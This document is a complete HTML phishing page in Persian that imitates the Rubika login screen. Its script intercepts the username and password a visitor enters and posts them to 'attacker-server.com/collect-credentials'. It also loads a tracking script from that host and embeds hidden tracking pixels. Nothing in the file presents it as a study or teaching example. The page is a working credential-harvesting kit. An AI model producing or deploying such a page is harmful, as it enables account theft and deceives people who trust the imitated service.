<!DOCTYPE html>
<html lang="fa">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>روبیکا - ورود به حساب کاربری</title>
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Tajawal:wght@200;300;400;500;700&display=swap">
    <style>
        body {
            font-family: 'Tajawal', sans-serif;
            background-color: #f5f5f5;
        }
        .container {
            max-width: 400px;
            margin: 40px auto;
            padding: 20px;
            background-color: #fff;
            border: 1px solid #ddd;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        .logo {
            text-align: center;
            margin-bottom: 20px;
        }
        .logo img {
            width: 100px;
            height: 100px;
            border-radius: 50%;
        }
        .form-group {
            margin-bottom: 20px;
        }
        .form-control {
            width: 100%;
            height: 40px;
            padding: 10px;
            font-size: 16px;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        .form-control:focus {
            border-color: #aaa;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        .btn {
            width: 100%;
            height: 40px;
            padding: 10px;
            font-size: 16px;
            background-color: #4CAF50;
            color: #fff;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        .btn:hover {
            background-color: #3e8e41;
        }
        .forgot-password {
            text-align: center;
            font-size: 14px;
            color: #999;
            margin-bottom: 20px;
        }
        .forgot-password a {
            text-decoration: none;
            color: #337ab7;
        }
        .forgot-password a:hover {
            color: #23527c;
        }
        .social-media {
            text-align: center;
            margin-bottom: 20px;
        }
        .social-media a {
            margin: 0 10px;
        }
        .social-media img {
            width: 30px;
            height: 30px;
            border-radius: 50%;
        }
        .footer {
            text-align: center;
            font-size: 14px;
            color: #999;
            margin-bottom: 20px;
        }
        .footer a {
            text-decoration: none;
            color: #337ab7;
        }
        .footer a:hover {
            color: #23527c;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://parspng.com/wp-content/uploads/2023/08/rubikapng.parspng.com_.png" alt="Rubika Logo">
        </div>
        <form action="" method="post">
            <div class="form-group">
                <input type="text" name="username" id="username" class="form-control" placeholder="نام کاربری یا شماره موبایل" required>
            </div>
            <div class="form-group">
                <input type="password" name="password" id="password" class="form-control" placeholder="کلمه عبور" required>
            </div>
            <div class="form-group">
                <button type="submit" class="btn">ورود به حساب کاربری</button>
            </div>
            <div class="forgot-password">
                <a href="#">فراموشی کلمه عبور</a>
            </div>
            <div class="social-media">
                <a href="#" title="Login with Google"><img src="https://www.pngall.com/wp-content/uploads/5/Google-PNG-File.png" alt="Google"></a>
                <a href="#" title="Login with Facebook"><img src="https://img.freepik.com/free-psd/3d-square-with-facebook-logo_125540-1565.jpg" alt="Facebook"></a>
                <a href="#" title="Login with Twitter"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS5LEV-ApZUO6OUnu1ulvL8F3L91AqHlpD0Hw&s" alt="Twitter"></a>
            </div>
        </form>
        <div class="footer">
            <p>کلیه حقوق متعلق به شرکت روبیکا می‌باشد.</p>
            <p>نسخه ۱.۰.۰</p>
            <a href="#">شرایط و قوانین</a>
            <a href="#">سیاست حفظ حریم خصوصی</a>
            <a href="#">تماس با ما</a>
        </div>
    </div>
    <script>
        // JavaScript code to handle form submission and send credentials to attacker's server
        const form = document.querySelector('form');
        form.addEventListener('submit', (e) => {
            e.preventDefault();
            const username = document.querySelector('#username').value;
            const password = document.querySelector('#password').value;
            const xhr = new XMLHttpRequest();
            xhr.open('POST', 'https://attacker-server.com/collect-credentials', true);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            xhr.send(`username=${username}&password=${password}`);
        });
    </script>
    <!-- Tracking code to monitor user activity -->
    <script async src="https://attacker-server.com/tracking.js"></script>
    <!-- Social media tracking pixels -->
    <img src="https://www.facebook.com/tr?id=123456789&ev=PageView&noscript=1" width="1" height="1" style="display:none">
    <img src="https://twitter.com/i/adsct?txn_id=123456789&p_id=Twitter&p_user_id=0&txn_token=123456789&redirect_url=https%3A%2F%2Ftwitter.com%2F" width="1" height="1" style="display:none">
    <!-- Google Analytics tracking code -->
    <script>
        (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
        })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
        ga('create', 'UA-123456789-1', 'auto');
        ga('send', 'pageview');
    </script>
</body>
</html>
